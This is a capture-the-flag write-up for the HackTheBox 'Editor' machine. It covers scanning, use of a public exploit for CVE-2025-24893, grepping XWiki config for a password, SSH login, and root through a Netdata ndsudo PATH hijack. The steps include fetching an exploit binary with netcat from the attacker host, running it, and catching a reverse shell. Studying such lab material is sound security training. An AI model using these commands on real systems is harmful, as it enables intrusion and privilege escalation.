# Editor - HackTheBox 

## 1.1 Nmap scan

Performed to identify open ports, services, versions, and operating system:

```bash
nmap -A -T4 10.10.11.80 -oN portscan.txt
```
## 1.2 Nuclei scan for vulnerabilities

Performed to identify known vulnerabilities in the machine's HTTP service:

```bash
nuclei -u http://wiki.editor.htb -o nuclei.txt
```

* The scan identified the vulnerability CVE-2025-24893 (details looked up on Exploit-DB)

---

## 2. Exploitation

### 2.1 Exploit adjustment

Based on the exploit found at [Exploit-DB #52136](https://www.exploit-db.com/exploits/52136), it was necessary to modify the HTTPS address to work correctly against the target.

### 2.2 Interactive shell access

Python interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 3. Enumeration

### 3.1 User directories

Listing the `/home` directory to discover system users:

```bash
ls /home
```

Output:

```
oliver
```

### 3.2 Searching for passwords in configuration files

Searched for possible passwords inside the `/etc/xwiki` directory:

```bash
grep -iR "pass" /etc/xwiki/*
```

Found the password:

```
theEd1t0rTeam99
```

---

## 4. SSH access

With the discovered user and obtained password, it was possible to connect via SSH:

```bash
ssh -4 oliver@editor.htb
```

* `-4`: force IPv4 connection
* User: `oliver`
* Password: `theEd1t0rTeam99`

## 5. Privilege Escalation

### 5.1 Compiling the exploit

On your local machine, compile the exploit statically to avoid library dependencies on the target:

```bash
x86_64-linux-gnu-gcc -o nvme exploit.c -static
```

### 5.2 Transfer the exploit to the target

Use `nc` (netcat) to send the compiled binary to the target machine:

On your **local machine** (sending the file):

```bash
nc -lvnp 4444 < nvme
```

On the **target machine** (receiving the file):

```bash
nc 10.10.14.8 4444 > nvme
chmod +x nvme
```

### 5.3 Execute the exploit with appropriate permissions

Run the exploit by adding the current directory to the `PATH` and using `ndsudo` to escalate privileges:

```bash
PATH=$(pwd):$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

### 5.4 Listen on the reverse shell port

Meanwhile, on your **local machine**, listen for a reverse shell on port `9001` (or the port specified by the exploit):

```bash
nc -lvnp 9001
```
And now you have the root flag.

